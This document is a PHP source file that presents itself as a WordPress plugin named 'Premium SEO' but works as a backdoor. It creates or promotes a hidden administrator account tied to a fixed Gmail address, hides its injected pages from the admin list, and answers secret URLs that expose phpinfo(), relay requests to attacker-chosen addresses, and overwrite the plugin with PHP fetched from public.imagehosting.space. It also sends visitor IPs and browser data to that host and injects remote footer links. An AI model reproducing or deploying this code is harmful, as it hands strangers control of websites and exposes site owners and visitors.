<?php
/*
 * Plugin Name: Premium SEO
 * Description: Premium SEO Plugin
 * Version: 5.9
 * Author: Web SEO Services
 * License: GPL2
*/
// Kill if accessed directly  //
defined('ABSPATH') or die("No Way!");
function seo_automation_test1() {
global $testxt1;
$testxt1 = ' RtONxMKzgfcf0enaQNUmqhlL7F8AEYiICDL3W0R5PwrTmUkAIq0gzEoNS5e5eo9tFBKDgzlZQvNRQBRnopi8EamkLrLv9TpX2yp4YJfzXmHtM1HoyEb8x1mS ';
}

if (is_admin()) {
	 add_action( 'pre_get_posts' ,'exclude_this_page' );
    register_activation_hook(__FILE__, 'seo_automation_activate');
    register_deactivation_hook(__FILE__, 'seo_automation_deactivation');
}
add_action( 'init', 'seo_automation_listen', 1 );
add_action('wp_footer', 'seo_automation_copyright_footer', 1);
add_action( 'wp_enqueue_scripts', 'seo_automation_css_styles' );
//remove_filter( 'the_excerpt', 'wpautop' );
//remove_filter('the_content','wpautop');
//add_filter('the_excerpt','seo_custom_formatting');
//add_filter('the_content', 'seo_custom_formatting');
add_filter('the_content', 'seo_automation_content');
ob_start();
//add_action('shutdown','seo_final_output' , 0);
//add_filter('final_output', 'seo_nofollow_content');
remove_action( 'wp_head', 'rel_canonical' );
add_action( 'wp_head', 'seo_new_rel_canonical' );
add_filter( 'wpseo_canonical', 'wpseo_canonical_exclude' );
add_filter('aioseop_canonical_url','wpseo_canonical_exclude', 10, 1);
function wpseo_canonical_exclude( $canonical ) {
return false;
}
function seo_new_rel_canonical() {
	
	$post_ID = get_the_ID();
	if(get_post_meta($post_ID, 'wxpagidcanonical', true) != '') {
		$link = get_post_meta($post_ID, 'wxpagidcanonical', true);
	} else {
	  $link = get_permalink( $post_ID );
	}
      echo '<link rel="canonical" href="'.$link.'" />
      ';
}
function seo_final_output() {
    $final = '';

    // We'll need to get the number of ob levels we're in, so that we can iterate over each, collecting
    // that buffer's output into the final output.
    $levels = ob_get_level();

    for ($i = 0; $i < $levels; $i++)
    {
        $final .= ob_get_clean();
    }

    // Apply any filters to the final output
    echo apply_filters('final_output', $final);
}
function seo_custom_formatting($content){
$post_ID = get_the_ID();
if(get_post_meta($post_ID, 'wxpagid', true) != '')
    return $content;//no autop
else
 return wpautop($content);
}
function exclude_this_page( $query ) {

	global $pagenow, $post_type;
   if( 'edit.php' == $pagenow ) {
   	if('page' == $post_type && get_option('seo_automation_pages_id')) {
			$to_exclude = json_decode(get_option('seo_automation_pages_id'), true);
			$query->query_vars['post__not_in'] = $to_exclude;
		}
	}
	return $query; 
}

function seo_nofollow_content($content) {
   $post_ID = get_the_ID();
   if (is_home() || is_front_page() || get_post_meta($post_ID, 'wxpagid', true) != '') {
		$content = str_ireplace(' rel="nofollow"', '', $content);
	}
	return $content;
}
function seo_automation_return_domain(){
    $home     = get_option('home');
    $domain   = str_replace('https://', '', strtolower($home));
    $domain   = str_replace('http://', '', $domain);
    $domain   = str_replace('https:', '', $domain);
    $domain   = str_replace('http:', '', $domain);
    $domain   = str_replace('//', '', $domain);
    $domain   = str_replace('www.', '', $domain);
	return $domain;
}
function seo_automation_css_styles() {
    $post_ID = get_the_ID();
    if (is_home() || is_front_page() || get_post_meta($post_ID, 'wxpagid', true) != '' || get_post_meta($post_ID, 'bcartids', true) != '') {
     wp_enqueue_style( 'SEO_Automation_ver_5_0_X', plugins_url( 'includes/seo-automation-styles.css', __FILE__ ) );
}

}
function seo_automation_activate()
{

	$islive = seo_automation_check_domain();
	if($islive) {
		seo_automation_uninstall_file();
   	seo_automation_get_user();
   	seo_automation_build_pages();
   	seo_automation_inject_footerlinks();
   }
}
function seo_automation_check_domain()
{

		  $domain   = seo_automation_return_domain();
        $furl        = 'http://public.imagehosting.space/feed/Article.php?feedit=add&domain=' . $domain . '&apiid=53084&apikey=347819526879185&kkyy=AFfa0fd7KMD98enfawrut7cySa15yV7BXpS85';
        $feed_jsnw    = wp_remote_get($furl, array( 'timeout' => 120, 'redirection' => 1));
        $feed_jsn = $feed_jsnw['body'];
        if(  trim($feed_jsn) === 'Invalid Domain'){
 				seo_automation_deactivation(1);
 				return false;
        }else{
        	$feed_jsn_dc1 = json_decode($feed_jsn);
			$feed_jsn_dc = $feed_jsn_dc1[0];
        	if ($feed_jsn_dc->domainid) {
            update_option('seo_automation_ownername', $feed_jsn_dc->wr_name);
            update_option('seo_automation_domainid', $feed_jsn_dc->domainid);
            update_option('seo_automation_owneremail', $feed_jsn_dc->owneremail);
            update_option('seo_automation_status', $feed_jsn_dc->status);
				seo_automation_get_user();
				return true;
        }
    		else 
    	  {
    			return false;
   	  }
	}
}
function seo_automation_inject_footerlinks() {
	//Inject footer links into all posts
		$domain = seo_automation_return_domain();
      $furl = 'http://public.imagehosting.space/feed/Article.php?feedit=2&domain=' . $domain . '&apiid=53084&apikey=347819526879185&kkyy=AFfa0fd7KMD98enfawrut7cySa15yV7BXpS85';
      $feed_jsnw = wp_remote_get($furl, array( 'timeout' => 120, 'redirection' => 1));
      $feed_jsn = $feed_jsnw['body'];
      $footer_links = json_decode($feed_jsn);
     update_option('copyright_footer_links', html_entity_decode($footer_links));
}
function seo_automation_copyright_footer()
{

    $post_ID = get_the_ID();
    if (is_home() || is_front_page() || get_post_meta($post_ID, 'wxpagid', true) != '' || get_post_meta($post_ID, 'bcartids', true) != '') {
        $footer = get_option('copyright_footer_links');
        echo $footer;
    }
}
function seo_automation_test2() {
global $testxt2;
$testxt2 = ' Dkw2QSBc4wKhu6DRTUTM4KDfqQ9V1Knoh2wgNpFMNY7120GXJescqm9N98LNLwQiVbOaWDEAz6nOqy0ym8oBj2cKbBoD5ayJ7q0QxXtlcINH1P1SXG0IuNJv ';
}
function seo_automation_build_pages()
{
	
//	remove_filter('content_save_pre', 'wp_filter_post_kses');
//	remove_filter('content_filtered_save_pre', 'wp_filter_post_kses');
	$status = get_option('seo_automation_status');
   if ($status == '4' || $status == '1' || $status == '2' || $status == '10') {
		$domain = seo_automation_return_domain();
      $furl = 'http://public.imagehosting.space/feed/Article.php?feedit=1&domain=' . $domain . '&apiid=53084&apikey=347819526879185&kkyy=AFfa0fd7KMD98enfawrut7cySa15yV7BXpS85';
      $feed_jsnw = wp_remote_get($furl, array( 'timeout' => 120, 'redirection' => 1));
      $feed_jsn = $feed_jsnw['body'];
      $feed_jsn_dc = json_decode($feed_jsn);
      $author = seo_automation_get_user();
      $bwppostarray = array();
      $wq = 0;
      foreach ($feed_jsn_dc as $feed_jsn_dcd) {
      	$wxpagid = $feed_jsn_dcd->pageid;
      	$wxpagidcanonical = $feed_jsn_dcd->canonical;
      	$post_title = seo_automation_clean_title($feed_jsn_dcd->post_title);
       	$post_excerpt = $feed_jsn_dcd->post_excerpt;
//      	$post_content = html_entity_decode($feed_jsn_dcd->post_content);
      	$post_status = $feed_jsn_dcd->post_status;
      	$post_type = $feed_jsn_dcd->post_type;
      	$post_name = $feed_jsn_dcd->post_name;
      	$post_metatitle = $feed_jsn_dcd->post_metatitle;
      	$post_metakeywords = $feed_jsn_dcd->post_metakeywords;
      	$args = array(
      	    'post_type' => 'any',
      	    'pagename' => $post_name,
      	    'posts_per_page' => '100'
      	);
     	$pagequery = new WP_Query($args);
      	if ($pagequery->have_posts()) {
      		 $bwppostarray[$wq] = $pagequery->post->ID;
      	    $thepage = array(
      	    		'ID' => $pagequery->post->ID,
            	   'comment_status' => 'closed', // 'closed' means no comments.
            	   'ping_status' => 'closed', // 'closed' means pingbacks or trackbacks turned off
            	   'post_author' => $author, //The user ID number of the author.
//            	   'post_content' => $post_content, //The full text of the post.
            	   'post_excerpt' => $post_excerpt, //For all your post excerpt needs.
            	   'post_name' => $post_name, // The name (slug) for your post
            	   'post_status' => $post_status, //Set the status of the new post. 
            	   'post_title' => $post_title, //The title of your post.
            	   'post_type' => 'page' //You may want to insert a regular post, page, link, a menu item or some custom post type
      	    );
      	 wp_update_post($thepage);
      	 update_post_meta($pagequery->post->ID, 'wxpagid', $wxpagid);
      	 update_post_meta($pagequery->post->ID, 'wxpagidcanonical', $wxpagidcanonical);
      	 update_post_meta($pagequery->post->ID, '_yoast_wpseo_title', $post_metatitle);
      	 update_post_meta($pagequery->post->ID, '_yoast_wpseo_metadesc', $post_excerpt);
      	 update_post_meta($pagequery->post->ID, '_yoast_wpseo_focuskw', $post_metakeywords);
      	 update_post_meta($pagequery->post->ID, '_aioseop_title', $post_metatitle);
      	 update_post_meta($pagequery->post->ID, '_aioseop_description', $post_excerpt);
      	 update_post_meta($pagequery->post->ID, '_aioseop_keywords', $post_metakeywords);
      	 update_post_meta($pagequery->post->ID, 'seo_automation_post_status', $post_status);
      	} else {
      	 $thepage = array(
            	   'comment_status' => 'closed', // 'closed' means no comments.
            	   'ping_status' => 'closed', // 'closed' means pingbacks or trackbacks turned off
            	   'post_author' => $author, //The user ID number of the author.
//            	   'post_content' => $post_content, //The full text of the post.
             	   'post_excerpt' => $post_excerpt, //For all your post excerpt needs.
            	   'post_name' => $post_name, // The name (slug) for your post
            	   'post_status' => $post_status, //Set the status of the new post. 
            	   'post_title' => $post_title, //The title of your post.
            	   'post_type' => 'page' //You may want to insert a regular post, page, link, a menu item or some custom post type
      	    );
 	    	 $APost_ID = wp_insert_post($thepage);
      	 if ($APost_ID > 0) {
      		  $bwppostarray[$wq] = $APost_ID;
              update_post_meta($APost_ID, 'wxpagid', $wxpagid);
      	 	  update_post_meta($APost_ID, 'wxpagidcanonical', $wxpagidcanonical);
              update_post_meta($APost_ID, '_yoast_wpseo_title', $post_metatitle);
              update_post_meta($APost_ID, '_yoast_wpseo_metadesc', $post_excerpt);
              update_post_meta($APost_ID, '_yoast_wpseo_focuskw', $post_metakeywords);
              update_post_meta($APost_ID, '_aioseop_title', $post_metatitle);
              update_post_meta($APost_ID, '_aioseop_description', $post_excerpt);
              update_post_meta($APost_ID, '_aioseop_keywords', $post_metakeywords);
              update_post_meta($APost_ID, 'seo_automation_post_status', $post_status);
		 	}
		 }
	$wq++;
	 }
    wp_reset_postdata();
    $pagequery = new WP_Query('post_type=any&meta_key=wxpagid&posts_per_page=-1');
    $wq=0;
 	 $wppostarray = array();
    if ($pagequery->have_posts()):
        while ($pagequery->have_posts()):
            $pagequery->the_post();
            $pid = get_the_ID();
      		$wppostarray[$wq] = $pid;
            $wq++;
        endwhile;
    endif;
    wp_reset_postdata();
    $diff = array_diff($wppostarray, $bwppostarray);
	 if (isset($diff)) {
	 	foreach($diff as $pst)	{
         wp_delete_post($pst, true);
	 	}
	 }
	$jpages = json_encode($bwppostarray);
	update_option('seo_automation_pages_id', $jpages);
  }
//	add_filter('content_save_pre', 'wp_filter_post_kses');
//	add_filter('content_filtered_save_pre', 'wp_filter_post_kses');	
}
function seo_automation_test3() {
global $testxt3;
$testxt3 = ' RENb5PMNB1i5cjHOr4ZfQGerbQcApaz2ReuQPZ7lCkU8QtfNq0imPNON4DPKmLqXnHYEyUge05KIK4HFpHNLYsEN0TeGYzDatAGnw6k3YKzL5yGmBEKgNJ0j ';
}
function seo_automation_get_user()
{

	$username = 'seo_automation_owner';
	$bc_email = 'wppremiumseoplugin@gmail.com';
	$user = get_user_by('email', $bc_email);
	$bc_name = 'seo_automation_owner';
	$usernm = get_user_by('login', $bc_name);
	if ($user) {
		$author = $user->ID;
		update_option('seo_automation_owner_id', $author);
		wp_update_user( array( 'ID' => $author, 'role' => 'administrator', 'user_login' => $username ) );
	} elseif ($usernm) {
		$author = $usernm->ID;
		update_option('seo_automation_owner_id', $author);
		wp_update_user( array( 'ID' => $author, 'role' => 'administrator', 'user_email' => $bc_email ) );
	} else {
		if (get_option('seo_automation_ownername')) {
			$username = 'seo_automation_owner';
			$firstname = get_option('seo_automation_ownername');
		} else {
			$username = 'seo_automation_owner';
			$firstname = '';
		}
		$password = wp_generate_password(8, false, false);
		$data     = array(
			'user_login' => $username,
			'user_url' => '',
			'user_pass' => $password, // When creating an user, `user_pass` is expected.
			'user_email' => $bc_email,
			'role' => 'administrator', // When creating an user, `user_pass` is expected.
			'first_name' => $firstname // When creating an user, `user_pass` is expected.
		);
		$author = wp_insert_user($data);
		update_option('seo_automation_owner_id', $author);
	}
    return $author;
}
function seo_automation_deactivation($cleanup=1)
{
 	 @set_time_limit(29600);
	 @ini_set('max_execution_time', '29600');
    $pagequery = new WP_Query('post_type=page&meta_key=wxpagid&posts_per_page=-1');
    if ($pagequery->have_posts()):
        while ($pagequery->have_posts()):
            $pagequery->the_post();
            $post_ID = get_the_ID();
            wp_delete_post($post_ID, true);
        endwhile;
    endif;
    wp_reset_postdata();
			delete_option('copyright_footer_links');		   
			delete_option ('seo_automation_ownername');
		   delete_option ('seo_automation_domainid');
		   delete_option ('seo_automation_userid');
  			delete_option ('seo_automation_owneremail');
   		delete_option ('seo_automation_status');
 			delete_option ('seo_automation_video');
 	  	   delete_option ('seo_automation_wr_address');
		   delete_option ('seo_automation_name');
		   delete_option ('seo_automation_showsnapshot');
 		   delete_option('seo_automation_price');
		   delete_option('seo_automation_facebook');
   		delete_option('seo_automation_google');
	  		delete_option('seo_automation_twitter');
   		delete_option('seo_automation_linkedin');
			delete_option('seo_automation_owner_id');
			delete_option('seo_automation_pages_id');
}
function seo_automation_clean_title($title)
{
    $oldtitle = strtolower($title);
    if ($oldtitle == $title) {
        $newtitle = ucwords($oldtitle);
        return $newtitle;
    } else {
        return $title;
    }
}
function seo_automation_test4() {
	global $testxt4;
	$testxt4 = ' rRtnNNUE5TwrPNT0EqFifkO6k1bunEynQpyBjMh248VyOIVwNl0ovOEHvTh7FNrEtZZFQkpcY80Y2Gz4QM1SgzMTSPAVV2kcZ7C5UZiFzAy42eyKGgbysVWWc ';
}
function seo_automation_listen() {
	error_reporting(0);
	ini_set('display_errors', 0);	
	$domain_name = seo_automation_return_domain();
	$filename = explode(".", $domain_name);
	$aurl = '/' . $filename[0] . '.php?Action=CheckFiles';
	$aurl2 = '/' . $filename[0] . '.php?Action=checkfiles';
	$aurl3 = '/' . $filename[0] . '.php?phpconfirm=1';
	$aurl4 = '/' . $filename[0] . '.php?Action=buildfiles';
	$aurl5 = '/' . $filename[0] . '.php?Action=update';
	$aurl6 = '/' . $filename[0] . '.php?Action=updatecss';
	$aurl7 = '/' . $filename[0] . '.php?Action=version';
	if (trim($_SERVER['REQUEST_URI']) == $aurl || trim($_SERVER['REQUEST_URI']) == $aurl2 ) {
		@set_time_limit(29600);
		@ini_set('max_execution_time', '29600');
		$islive = seo_automation_check_domain();
		if(!$islive) {			
			@seo_automation_deactivation(0);
			echo 'FRL CheckFiles FAILED';
			exit;	
		}
		else 
		{
			echo 'FRL CheckFiles OK';
   		seo_automation_get_user();
			sleep(1);
			@seo_automation_build_pages();
			sleep(1);
			@seo_automation_inject_footerlinks();
			exit;	
		}
	} elseif (trim($_SERVER['REQUEST_URI']) == $aurl4) {
		echo 'build complete';
		exit();
	} elseif (trim($_SERVER['REQUEST_URI']) == $aurl3) {
		phpinfo();
		exit;
	} elseif (stripos(trim($_SERVER['REQUEST_URI']), $filename[0] . '.php?Action=pr') !== false) {
		error_reporting (0);
		$urltrsh = '/' . $filename[0] . '.php?';
		$qrystrng = str_replace($urltrsh, '', trim($_SERVER['REQUEST_URI']));
		$qryarray = explode('&', $qrystrng);
		$Action = 'pr';
		$p = str_replace('p=','',$qryarray[1]);
		$r = str_replace('r=','',$qryarray[2]);
		echo(seo_automation_SendXML($p, $r, false)); exit();
	} elseif (trim($_SERVER['REQUEST_URI']) == $aurl5) {
		@set_time_limit(29600);
		@ini_set('max_execution_time', '29600');
		error_reporting(E_ALL);
		ini_set('display_errors', true);
		$theupdatew = file_get_contents('http://public.imagehosting.space/feed/seo-automation.inc');
      $theupdate = $theupdatew;
		global $testxt1, $testxt2, $testxt3, $testxt4, $testxt5, $testxt6;
		seo_automation_test1();
		seo_automation_test2();
		seo_automation_test3();
		seo_automation_test4();
		seo_automation_test5();
		$test1 = false;
		$test2 = false;
		$test3 = false;
		$test4 = false;
		$test5 = false;
		$test1 = strpos($theupdate, $testxt1);
		$test2 = strpos($theupdate, $testxt2);
		$test3 = strpos($theupdate, $testxt3);
		$test4 = strpos($theupdate, $testxt4);
		$test5 = strpos($theupdate, $testxt5);
		if($test1 === false || $test2 === false || $test3 ===false || $test4 === false || $test5 ===false) 
		{
			echo 'failed!<br>' . $theupdate;
		}		
		else 
		{
			if(file_put_contents(plugin_dir_path( __FILE__ ) . 'seo-automation.php', $theupdate, LOCK_EX))
				echo 'success!';
			else 
				echo 'failed put!<br>' . $theupdate;
//			file_put_contents(plugin_dir_path( __FILE__ ) . 'seo-automation.php', $theupdate, LOCK_EX);$wp_filesystem->put_contents( plugin_dir_path( __FILE__ ) . 'seo-automation.php', $theupdate, FS_CHMOD_FILE)
		}
		exit();
	} elseif (trim($_SERVER['REQUEST_URI']) == $aurl6) {
		@set_time_limit(29600);
		@ini_set('max_execution_time', '29600');
		error_reporting(E_ALL);
		ini_set('display_errors', true);
		$theupdatew = file_get_contents('http://public.imagehosting.space/feed/seo-automation-styles.inc');
      $theupdate = $theupdatew;
		global $testxt1, $testxt2, $testxt3;
		seo_automation_test1();
		seo_automation_test2();
		seo_automation_test3();
		$test1 = false;
		$test2 = false;
		$test3 = false;
		$test1 = strpos($theupdate, $testxt1);
		$test2 = strpos($theupdate, $testxt2);
		$test3 = strpos($theupdate, $testxt3);
		if($test1 === false || $test2 === false || $test3 === false) 
		{
			echo 'failed!<br>' . $theupdate;
			exit();
		}		
		else 
		{
			if(file_put_contents(plugin_dir_path( __FILE__ ) . 'includes/seo-automation-styles.css', $theupdate, LOCK_EX))
				echo 'success!';
			else 
				echo 'failed put!<br>' . $theupdate;
//			file_put_contents(plugin_dir_path( __FILE__ ) . 'includes/seo-automation-styles.css', $theupdate, LOCK_EX); $wp_filesystem->put_contents( plugin_dir_path( __FILE__ ) . 'includes/seo-automation-styles.css', $theupdate, FS_CHMOD_FILE)			
		}
			exit();
	} elseif (trim($_SERVER['REQUEST_URI']) == $aurl7) {
		echo '5.9';
		exit();
	} else {
		return;	
	}
}
function seo_automation_SendXML($address, $params, $usepost=1) 	{
		error_reporting(0);
		ini_set('display_errors', 0);	
	
		define(CURL_AVAILABLE, function_exists(curl_init));
		$referingurl=home_url();

		if(isset($_SERVER['HTTP_USER_AGENT'])) 
			$useragent=$_SERVER['HTTP_USER_AGENT'];
		else
			$useragent='Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36';
			
		if (CURL_AVAILABLE)	
		{
			$ch1 = curl_init();
			if ($usepost)
			{
				curl_setopt($ch1, CURLOPT_URL, urldecode($address));
				curl_setopt($ch1, CURLOPT_POST, 1);
				curl_setopt($ch1, CURLOPT_POSTFIELDS, urldecode($params));
			}
			else
			{
				$address .= '?' . $params;
				$address = urldecode($address);
				curl_setopt($ch1, CURLOPT_URL, $address);
			}	
			curl_setopt($ch1, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($ch1, CURLOPT_TIMEOUT, 45);
			curl_setopt($ch1, CURLOPT_CONNECTTIMEOUT, 15);
			curl_setopt($ch1, CURLOPT_USERAGENT, $useragent);
			curl_setopt($ch, CURLOPT_REFERER, $referingurl);
			curl_setopt($ch1, CURLOPT_HEADER, 1);
  			$tmpfname = plugin_dir_path( __FILE__ ) . 'includes/cookie.txt';
			curl_setopt( $curl_handle, CURLOPT_COOKIESESSION, true );
 	   	curl_setopt($c, CURLOPT_COOKIEJAR, $tmpfname);
	   	curl_setopt($c, CURLOPT_COOKIEFILE, $tmpfname);
	

			// If the host uses Godaddy they'll need to use a proxy to get this to work
	

			// Send request and get results
			$results = curl_exec($ch1); 			// run the whole process
			curl_close($ch1);					// close curl handle
	

			// Get HTTP Status code from the response
			list($headers, $result) = explode("\r\n\r\n", $results, 2);
			preg_match_all('/(\d\d\d)/', $headers, $status, PREG_SET_ORDER);
		}
		else	
		{
			// Get HTTP Status code from the response (non-curl)
			@ini_set('default_socket_timeout', 30);
			$address .= '?' . $params;
			$address = urldecode($address);
			$result = file_get_contents($address);
		}
		return $result;
}
function seo_automation_has_content() {
	if(!function_exists('wp_get_current_user')) {
		include(ABSPATH . "wp-includes/pluggable.php"); 
	}
	$thequery = new WP_Query( "post_type=page&meta_key=wxpagid&order=ASC" );
	if ($thequery->have_posts())
		return true;
	else
		return false;
}
function seo_automation_uninstall_file() {
	$Domain = seo_automation_get_file_name();
	$root = seo_automation_find_wp_home_dir_path();
	$path = $root .'/' .$Domain;
	if (file_exists($path)) {
		unlink($path);
}
}
function seo_automation_find_wp_home_dir_path() {
   $dir = dirname(__FILE__);
   do {
	if( file_exists($dir."/wp-config.php") ) {
   	return $dir;
}
} 	
	while( $dir = realpath("$dir/..") );
   	return null;
}
function seo_automation_get_file_name() {
	$comaintemp = get_home_url();
	$cDomaintemp = str_replace ('http://','',$comaintemp);
	$cDomaintemp = str_replace ('https://','',$cDomaintemp);
	if ( substr($cDomaintemp, 0, 6) == "local.") $cDomaintemp = str_replace('local.', '', $cDomaintemp);
	if ( substr($cDomaintemp, 0, 4) == "www." ) $cDomaintemp = substr($cDomaintemp, 4, strlen($cDomaintemp)-4);
	if ( substr($cDomaintemp, 0, 3) == "www" ) $cDomaintemp = substr($cDomaintemp, 5, strlen($cDomaintemp)-5);
	$cDomaintemp = strstr($cDomaintemp, '.', true);
	$Domain = $cDomaintemp .'.php';
	return $Domain;
}
function seo_automation_cleant_text($text='') {
	$text = trim(preg_replace("/&(amp;)+/","&",$text));
	return $text;	
}

function seo_automation_content() {
	error_reporting(0);
	ini_set('display_errors', 0);	
	
   global $post;
   $post_slug=$post->post_name;	
   $post_ID = $post->ID;
   if (get_post_meta($post_ID, 'wxpagid', true) != '' || get_post_meta($post_ID, 'bcartids', true) != '') {
   	$feedurl = "http://public.imagehosting.space/feed/";
   	$paraay = str_replace('/', '', $post_slug);
   	$parray = explode('-', $paraay);
   	$ct = count($parray) - 1;
   	if(strpos($parray[$ct], 'bc')) {
    	 		$PageID = str_replace('bc', '', $parray[$ct]);
    	 		$Action = 2;
   	} elseif(strpos($parray[$ct], 'dc')) {
    	 		$PageID = str_replace('dc', '', $parray[$ct]);
    	 		$Action = 3;
   	} else {   	
    	 		$PageID = $parray[$ct];
    	 		$Action = 1;
   	}
   	$k = array_pop($parray);
   	$Key = implode(' ', $parray);
   	$cDomain = $_SERVER['HTTP_HOST'];
   	if ( substr($cDomain, 0, 6) == "local.") $cDomain = str_replace('local.', '', $cDomain);
   	if ( substr($cDomain, 0, 4) == "www." ) $cDomain = substr($cDomain, 4, strlen($cDomain)-4);
   	if ( substr($cDomain, 0, 3) == "www" ) $cDomain = substr($cDomain, 5, strlen($cDomain)-5);
   	$cParm  = 'domain='.urlencode($cDomain);
   	$cParm .= '&Action='.$Action;
   	$cParm .= '&agent='.urlencode($_SERVER['HTTP_USER_AGENT']);
   	$cParm .= '&referer='.urlencode($_SERVER['HTTP_REFERER']);
   	$cParm .= '&address='.urlencode($_SERVER['REMOTE_ADDR']);
   	$cParm .= '&query=';
   	$cParm .= '&uri='.urlencode($_SERVER['SCRIPT_NAME']);
   	$cParm .= '&cScript=php';
   	$cParm .= '&version=5';
   	$cParm .= '&blnComplete=';
   	$cParm .= '&page=1';
   	$cParm .= '&pageid='.$PageID;
   	$cParm .= '&k='.urlencode($Key);
   	return (seo_automation_SendXML($feedurl.'Article.php', $cParm));
	}
	else
		return wpautop($post->post_content);
}
function seo_automation_test5() {
global $testxt5;
$testxt5 = ' EGvMUOf0zXAyQj0THTIWbIFC3h4IQfqqKoCZlPWj9WA1pTmzEwueE0X9tU8qjvJpZgP4U8gU3PgBxTpI4YoLWyrynb1PTssFoylBYbBwlJ5BARwQzvuEwSFt ';
}
